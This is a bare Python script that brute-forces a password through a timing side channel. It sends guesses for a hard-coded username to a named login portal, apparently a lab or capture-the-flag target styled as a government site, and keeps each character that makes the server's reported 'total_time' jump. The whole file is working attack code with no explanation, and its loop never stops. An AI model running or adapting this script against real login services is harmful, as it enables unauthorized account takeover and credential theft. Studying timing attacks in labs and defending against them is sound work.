import requests
def try_password(url, username, password_guess, i):
    data = {'username': username, 'password': password_guess}
    response = requests.post(url, json=data)
    json = response.json()
    total_time = json['total_time']
    if total_time > i + 1:
        return True
    else:
        return False


def find_password(url, username):
    password = 'aaaaaaaaaaaaaaaaa'
    characters = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\]^`{|}~'
    final_password = ''
    i = 0
    while True:
        for char in characters:
            password = password[:i] + char + password[i+1:]
            if try_password(url, username, password, i):
                final_password += char
                print(final_password)
                break

        i += 1


url = 'https://portal.regjeringen.uiaikt.no/login'
username = 'jonas.dahl'
find_password(url, username)
